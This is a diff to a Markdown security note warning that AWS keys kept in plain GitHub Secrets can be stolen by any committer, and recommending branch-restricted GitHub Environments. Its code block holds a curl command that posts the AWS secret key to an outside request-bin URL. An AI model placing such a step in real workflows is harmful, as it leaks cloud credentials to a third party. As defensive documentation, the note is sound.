@@ -4,11 +4,11 @@ But **never use the "Administration Role" on Production!**
 Because if you get access to these access keys, 
 you can easily create a new user with web console access and have full access to your AWS account.
 
-I would even say never use this "Administration Role" for any AWS account, if you only 
+Furthermore, avoid using the "Administration Role" for any AWS account if you only 
 store the keys in GitHub Secrets without using the GitHub Environment with the "Protected Branch" configuration.  
 
-Because if you only store the keys in Github Secrets, 
-any user who is allowed to commit to any branch can use Github Actions to send the keys to their own backend:
+Storing keys directly in GitHub Secrets without additional security controls can lead to unauthorized access. 
+Any user with commit privileges could potentially utilize GitHub Actions to extract these keys
 
 ```
 curl -d '{ "name": "${{ secrets.AWS_SECRET_KEY }}" }' \
@@ -16,4 +16,5 @@ curl -d '{ "name": "${{ secrets.AWS_SECRET_KEY }}" }' \
   https://enci4g46iahum.x.pipedream.net/
 ```
 
-So use the Environments on GitHub Repository level to allow the keys only on certain branches.
+Therefore, it is advisable to use GitHub environments to restrict key access to specific branches within your repository. 
+This practice helps to increase security and keep controlled access to sensitive information.
